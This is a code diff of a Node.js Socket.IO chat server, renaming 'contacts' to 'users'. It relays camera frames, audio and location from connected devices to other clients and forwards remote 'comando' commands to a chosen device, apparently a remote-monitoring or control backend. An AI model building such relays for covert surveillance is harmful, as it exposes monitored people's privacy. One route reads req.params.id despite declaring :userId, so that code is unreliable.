+// Buscar mensagens
+app.get('/api/messages/:userId', (req, res) => {
   res.json(messages.get(req.params.id) || []);
 });
 
 // ========== SOCKET.IO ==========
 io.on('connection', (socket) => {
   console.log('Client connected:', socket.id);
-  let currentContactId = null;
+  let currentUserId = null;
 
-  socket.on('contact_login', ({ contactId, name }) => {
-    const contact = contacts.get(contactId);
-    if(!contact) {
+  socket.on('user_login', ({ userId, name }) => {
+    const user = users.get(userId);
+    if(!user) {
       socket.emit('login_error', { error: 'Invalid code' });
       return;
     }
-    if(contact.name !== name) {
+    if(user.name !== name) {
       socket.emit('login_error', { error: 'Name mismatch' });
       return;
     }
-    if(contact.socketId) {
-      const old = io.sockets.sockets.get(contact.socketId);
+    if(user.socketId) {
+      const old = io.sockets.sockets.get(user.socketId);
       if(old) { old.emit('force_disconnect', { reason: 'New connection' }); old.disconnect(); }
     }
-    contact.socketId = socket.id;
-    contact.online = true;
-    contact.lastSeen = new Date();
-    currentContactId = contactId;
+    user.socketId = socket.id;
+    user.online = true;
+    user.lastSeen = new Date();
+    currentUserId = userId;
 
-    io.emit('contact_status_change', { contactId, online: true, name: contact.name });
+    io.emit('user_status_change', { userId, online: true, name: user.name });
     socket.emit('login_success', {
-      contactId,
-      name: contact.name,
-      messages: messages.get(contactId) || []
+      userId,
+      name: user.name,
+      messages: messages.get(userId) || []
     });
-    console.log('✅ ' + contact.name + ' online');
+    console.log('✅ ' + user.name + ' online');
   });
 
   socket.on('send_message', (data) => {
@@ -1159,20 +1169,20 @@ io.on('connection', (socket) => {
       const newMsg = { id: uuidv4(), from: 'pc', to, text, timestamp: new Date(), isRead: false };
       msgs.push(newMsg);
       messages.set(to, msgs);
-      const contact = contacts.get(to);
-      if(contact && contact.socketId) {
-        io.to(contact.socketId).emit('new_message', newMsg);
+      const user = users.get(to);
+      if(user && user.socketId) {
+        io.to(user.socketId).emit('new_message', newMsg);
       }
       socket.emit('message_sent', newMsg);
     } else {
-      from = currentContactId;
-      const contact = contacts.get(currentContactId);
-      senderName = contact ? contact.name : 'User';
-      const msgs = messages.get(currentContactId) || [];
-      const newMsg = { id: uuidv4(), from: currentContactId, to: 'pc', text, timestamp: new Date(), isRead: false };
+      from = currentUserId;
+      const user = users.get(currentUserId);
+      senderName = user ? user.name : 'User';
+      const msgs = messages.get(currentUserId) || [];
+      const newMsg = { id: uuidv4(), from: currentUserId, to: 'pc', text, timestamp: new Date(), isRead: false };
       msgs.push(newMsg);
-      messages.set(currentContactId, msgs);
-      io.emit('new_message_from_contact', { ...newMsg, contactName: senderName, contactId: currentContactId });
+      messages.set(currentUserId, msgs);
+      io.emit('new_message_from_user', { ...newMsg, userName: senderName, userId: currentUserId });
       socket.emit('message_sent', newMsg);
     }
     console.log('💬 ' + senderName + ': ' + text);
@@ -1180,51 +1190,51 @@ io.on('connection', (socket) => {
 
   socket.on('typing_start', ({ to, isFromPc }) => {
     if(isFromPc) {
-      const contact = contacts.get(to);
-      if(contact && contact.socketId) io.to(contact.socketId).emit('contact_typing', { isTyping: true });
+      const user = users.get(to);
+      if(user && user.socketId) io.to(user.socketId).emit('user_typing', { isTyping: true });
     } else {
-      socket.broadcast.emit('contact_typing', { contactId: currentContactId, isTyping: true });
+      socket.broadcast.emit('user_typing', { userId: currentUserId, isTyping: true });
     }
   });
 
   socket.on('typing_stop', ({ to, isFromPc }) => {
     if(isFromPc) {
-      const contact = contacts.get(to);
-      if(contact && contact.socketId) io.to(contact.socketId).emit('contact_typing', { isTyping: false });
+      const user = users.get(to);
+      if(user && user.socketId) io.to(user.socketId).emit('user_typing', { isTyping: false });
     } else {
-      socket.broadcast.emit('contact_typing', { contactId: currentContactId, isTyping: false });
+      socket.broadcast.emit('user_typing', { userId: currentUserId, isTyping: false });
     }
   });
 
   socket.on('frame', (frameData) => {
-    if(currentContactId) socket.broadcast.emit('contact_frame', { contactId: currentContactId, frame: frameData });
+    if(currentUserId) socket.broadcast.emit('user_frame', { userId: currentUserId, frame: frameData });
   });
 
   socket.on('audio', (audioData) => {
-    if(currentContactId) socket.broadcast.emit('contact_audio', { contactId: currentContactId, audio: audioData });
+    if(currentUserId) socket.broadcast.emit('user_audio', { userId: currentUserId, audio: audioData });
   });
 
   socket.on('location', (loc) => {
-    if(currentContactId) socket.broadcast.emit('contact_location', { contactId: currentContactId, location: loc });
+    if(currentUserId) socket.broadcast.emit('user_location', { userId: currentUserId, location: loc });
   });
 
-  socket.on('comando', ({ contactId, command }) => {
-    const contact = contacts.get(contactId);
-    if(contact && contact.socketId) {
-      io.to(contact.socketId).emit('comando', command);
+  socket.on('comando', ({ userId, command }) => {
+    const user = users.get(userId);
+    if(user && user.socketId) {
+      io.to(user.socketId).emit('comando', command);
     }
   });
 
   socket.on('disconnect', () => {
     console.log('Client disconnected:', socket.id);
-    if(currentContactId) {
-      const contact = contacts.get(currentContactId);
-      if(contact) {
-        contact.online = false;
-        contact.lastSeen = new Date();
-        contact.socketId = null;
-        io.emit('contact_status_change', { contactId: currentContactId, online: false, name: contact.name });
-        console.log('❌ ' + contact.name + ' offline');
+    if(currentUserId) {
+      const user = users.get(currentUserId);
+      if(user) {
+        user.online = false;
+        user.lastSeen = new Date();
+        user.socketId = null;
+        io.emit('user_status_change', { userId: currentUserId, online: false, name: user.name });
+        console.log('❌ ' + user.name + ' offline');
       }
     }
   });
@@ -1243,9 +1253,9 @@ server.listen(PORT, '0.0.0.0', () => {
   console.log('   ✓ REMOTE COMMANDS\n');
 
   setTimeout(() => {
-    if(contacts.size === 0) {
+    if(users.size === 0) {
       const id = uuidv4();
-      contacts.set(id, { id, name: 'Demo User', phone: '(11) 99999-9999', socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() });
+      users.set(id, { id, name: 'Demo User', socketId: null, online: false, lastSeen: new Date(), createdAt: new Date() });
       messages.set(id, []);
       console.log('● DEMO CODE GENERATED ●');
       console.log('   CODE: ' + id);
